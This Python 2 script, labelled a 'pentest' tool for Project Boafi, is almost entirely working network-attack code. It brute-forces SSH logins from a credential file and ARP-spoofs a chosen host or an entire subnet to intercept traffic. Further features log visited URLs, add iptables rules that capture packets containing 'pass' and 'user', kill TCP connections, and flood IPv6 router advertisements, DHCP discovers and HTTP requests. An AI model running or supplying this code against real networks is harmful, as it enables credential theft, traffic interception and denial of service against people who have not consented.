#!/usr/bin/python
# -*- coding: utf-8 -*-
########## boafi Pentest script
########## - Perform various pentests automatically and save reports for further study
########## - Features/TODOs: Ipv6,DHCP,DNS,NTP,exploits,mitm..
########## - Router bruteforce for easy guessable passwords
########## - Scan networks hosts and identify vulnerabilities
########## ...

###  Author: Yessou Sami
###  Project Boafi

## Dependencies: dsniff(arpspoof),paramiko(ssh bruteforce),iptables,scapy

import os,time,argparse,random,paramiko,socket,logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from datetime import datetime

## Functions

def brute_pass(usr,passwd,ip,port):
            print "Trying for "+usr+" - "+passwd
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip,port,usr,passwd)
                print "Password is: ",passwd
                open("foundpass","a").write("IP: "+ip+" PORT: "+port+" USER: "+usr+" PASS: "+passwd)
            except paramiko.AuthenticationException:
                print("Bad Password - "+passwd)
                ssh.close()
            except socket.error:
                print("Failed connection")
                ssh.close()




def EnaLogging():
        os.popen("iptables -I FORWARD -p all -j LOG --log-prefix 'GENERAL-LOG-'")
        #Start Logging eve,ry connection to /var/log/messages

        #Log also images on /tmp?
        os.popen("iptables -I FORWARD -p all -m string --string 'jpg' --algo kmp  -j LOG --log-prefix 'JPG-LOG-'")
        os.popen("iptables -I FORWARD -p all -m string --string 'gif' --algo kmp  -j LOG --log-prefix 'GIF-LOG-'")
        os.popen("iptables -I FORWARD -p all -m string --string 'png' --algo kmp  -j LOG --log-prefix 'PNG-LOG-'")
        os.popen("iptables -I FORWARD -p all -m string --string 'mp4' --algo kmp  -j LOG --log-prefix 'mp4-LOG-'")
        #Log urls/web request
        os.popen("iptables -I FORWARD -p tcp -m multiport --dports 80,443 -j LOG --log-prefix 'WWW-LOG-' ")
        #Log DNS
        os.popen("iptables -I FORWARD -p udp --dport 53 -j LOG --log-prefix 'DNS-LOG-'")
        #Log credentials HTTP
        os.popen("iptables -I FORWARD -p all -m string --string 'pass' --algo kmp -j LOG --log-prefix 'PASSWORD-LOG-'")
        os.popen("iptables -I FORWARD -p all -m string --string 'user' --algo kmp  -j LOG --log-prefix 'USERNAME-LOG-'")

###




parser = argparse.ArgumentParser()


parser.add_argument('-timeout', action='store', dest='timeout', default="none",
                    help='Define given seconds before the attack timeouts (mitm,scan,stress) if not specified will run until is killed')

parser.add_argument('-RA', action='store', dest='ipv6ra', default=False,
                    help='Flood ipv6 router advertisements for given minutes')


parser.add_argument('-file', action='store', dest='output', default=False,
                    help='File output for scans')


parser.add_argument('-scan', action='store', dest='scan', default=False,
                    help='Scan the given network address or host')

##ArpScan still in betatest.. need to fix scapy responses
parser.add_argument('--arpScan', action='store_true', dest='arpscan', default=False,
                    help='Arpscan to scan fast on LAN')

parser.add_argument('--syn', action='store_true', dest='syn', default=False,
                    help='SYN Scan enabled')

parser.add_argument('--service', action='store_true', dest='service', default=False,
                    help='Service Version detection enabled')

parser.add_argument('-brute', action='store', dest='brute', default="none",
                    help='Bruteforce SSH of given ip... example : -brute file-192.168.1.254:22')

parser.add_argument('-mitm', action='store', dest='mitm', default="none",
                    help='Perform MITM Attack on target')

parser.add_argument('-mitmAll', action='store', dest='mitmall', default="none",
                    help='Perform MITM Attack on all hosts')

parser.add_argument('-stop-mitm', action='store_true', dest='stopmitm', default=False,
                    help='Stop any Running MITM Attack')

parser.add_argument('-denyTcp', action='store', dest='denytcp', default="none",
                    help='Deny tcp connections of given host')

parser.add_argument('--dg', action='store', dest='dg', default="none",
                    help='Perform MITM Attack with given Default Gateway')


parser.add_argument('-craft', action='store', dest='packetcraft', default=False,
                    help='Enable Packet Crafting.. Example: -craft IP-TCP-DST192.168.1.1-SRC192.168.1.10-DPORT80')


parser.add_argument('-stress', action='store', dest='stress', default="none",
                    help='Perform Stress Testing on LAN.. Modes: DHCPv4-50,DHCPv6')



results = parser.parse_args()

### Functions
def httpflood(target):
    ip=target
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        s.send("""GET /?="""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """)
        print """GET /"""+str(random.randrange(9999999))+""" HTTP/1.1\r\n
              Connection: Keep-Alive """
    except ValueError:
        print "Host seems down or some connection error trying again..."
##################

if not(results.output):
        output=str(time.time())
else:
        output=results.output
syn=""
scantype="-sn" #basic ping scan
if not(results.timeout=="none"):
    timeout="timeout "+results.timeout+"s "
    print "\n\nTimeout set for seconds:"+results.timeout
else:
    timeout=""

if(results.scan):
        ipaddr=str(results.scan)
        if(results.arpscan): ##BETA TEST
                res,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipaddr))
                output=str(res.summary( lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%")))
                file=open("arpscan.txt","a")
                print output
                file.write(output)
                file.close()
        else:
                print ipaddr
                if(results.syn):
                        scantype="-sS -O" #syn and
                if(results.service):
                        scantype=scantype+" -sV"
                scancmd=timeout+"sudo nmap "+scantype+" -oX "+output+" "+ipaddr   #writes xml output so we can convert it into html
                print scancmd
                print os.popen(scancmd).read() #ping scan to know online hosts



if(results.ipv6ra):
        minutes=results.ipv6ra
        print "running for minutes: "+minutes
        #run ipv6 RA flooding for N minutes
        i=0
        while (i <= minutes):
                print "Firing RAs everywhere"
                a = IPv6()
                a.dst = "ff02::1" #IPv6 Destination "Everyone" Multicast (broadcast)
                a.display()
                b = ICMPv6ND_RA()
                b.display()
                c = ICMPv6NDOptSrcLLAddr()
                c.lladdr = "00:50:56:24:3b:c0" #MAC
                c.display()
                d = ICMPv6NDOptMTU()
                d.display()
                e = ICMPv6NDOptPrefixInfo()
                e.prefixlen = 64
                randomhex=hex(random.randint(0, 16777215))[2:].upper()
                prefix=randomhex[:4]
                e.prefix = prefix+"::" #Global Prefix
                e.display()
                send(a/b/c/d/e)  # Send the packet
                print "Sending IPv6 RA Packet :)"
                time.sleep(1)
                i=i+1
                print i
if not(results.denytcp=="none"): #Works if you are the gateway or during MITM
                target=results.denytcp
                os.popen("nohup "+timeout+"tcpkill host "+target+" >/dev/null 2>&1 &")
                #deny tcp traffic
if not(results.mitmall=="none"): #Most efficent way to arpspoof subnet
        ipnet=results.mitmall
        iplist=os.popen("nmap -sP "+ipnet+" | grep 'Nmap scan' | awk '{ print $5; }'").read()
        iplist=iplist.split()
        dgip=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
        dgip=dgip.split()[0]
        print "Spoofing "+dgip+"\n\n"
        print "Targets: \n"
        for ip in iplist:
                print ip
                os.popen("nohup "+timeout+"arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")
        os.popen("nohup "+timeout+"urlsnarf  >> visitedsites >/dev/null 2>&1 &")
        EnaLogging() # Enable iptables-logging

if not(results.mitm=="none"):
        print "im in"
        target=results.mitm
        if(results.dg=="none"): #Searches for gateway
                dg=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
                dg=dg.split()[0]
                print dg
        else:
                dg=results.dg


        #Automatically searches for gateway and arpspoof all hosts
        os.popen("nohup "+timeout+"arpspoof -t "+target+" "+dg+" >/dev/null 2>&1 &")
        os.popen("nohup "+timeout+"urlsnarf  >> visitedsites &")
        print "Started ARP Spoof and URL Logging"

        #Start ARP Spoofing with given arguments or calculated ones

        EnaLogging() # Enable iptables-logging
        print "Added temp firewall rules to log MITM traffic"



if(results.packetcraft): #Packet Crafting with scapy

########### PACKET CRAFTING EXAMPLE TCP-DST192.168.1.1-SRC192.168.1.10
###########  ./boafiPenTest.py -craft TCP-DST192.168.1.1-SRC192.168.1.10-DPORT80-5
        craft=(results.packetcraft).split("-")
        if("TCP" in craft[0]):
                a=IP()/TCP()
        elif("UDP" in craft[0]):
                a=IP()/UDP()
        if("DST" in craft[1]):
                ipdst=craft[1].replace("DST","")
                a.dst=ipdst
        if("SRC" in craft[2]):
                ipsrc=craft[2].replace("SRC","")
                a.src=ipsrc
        if("DPORT" in craft[3]):
                dport=craft[3].replace("DPORT","")
                a.dport=dport
        n=craft[4] ##N° of packets
        i=0
        while(i<=n):
                i=i+1
                a.display()
                send(a)
                print "Sent packet"



if not(results.stress=="none"):
        try: #if it can
                rawstring=results.stress.split("-")
                mode=rawstring[0]
        except:
                print "Can't parse your command"
                print "\nusing default DHCPv4 stress attack"
                mode="DHCPv4"
                count=20

        if("DHCPv4" in mode): # DHCPv4-50
                count=int(rawstring[1])
                iface = "eth0"
                unique_hexdigits = str.encode("".join(set(string.hexdigits.lower())))
                print unique_hexdigits
                packet = (Ether(dst="ff:ff:ff:ff:ff:ff")/
                IP(src="0.0.0.0", dst="255.255.255.255")/
                UDP(sport=68, dport=67)/
                BOOTP(chaddr=RandString(12, unique_hexdigits))/
                DHCP(options=[("message-type", "discover"), "end"]))
                print "Sending dhcp requests"
                sendp(packet,iface=iface,count=count)

        if("HTTP" in mode): #HTTP-192.168.1.1-500
                ip=rawstring[1]
                count=int(rawstring[2])
                i=0
                while(i<=count):
                        i=i+1
                        httpflood(ip)
                print "Finished flooding!"

if not(results.brute=="none"):  # file-192.168.1.254:22     # file example :  usr:pass format!!
        cmd=results.brute ### Parsing strings to avoid errors
        file=cmd.split("-")[0]
        ip=cmd.split("-")[1]
        ipparsed=ip.split(":")
        ip=ipparsed[0].split()[0]
        port=int(ipparsed[1].split()[0]) #remove spaces and then int
        f=open(file,"r")
        print "Start bruteforcing "+ip+" with list: "+file
        for line in f:
                usr=line.split(":")[0].split()[0] # remove spaces if any
                passwd=line.split(":")[1].split()[0] #like above
                brute_pass(usr,passwd,ip,port)





if(results.stopmitm): #Stop MITM...hosts should re-generate ARP automatically
        os.popen("killall arpspoof")
        os.popen("killall tcpkill")



# TODO
## mitm --> interact with SDS to get realtime data for visualization
## metasploit attacks?
## if connected to internet send info on "cloud"(site db)
## save data on xml,csv for webGUI visualization
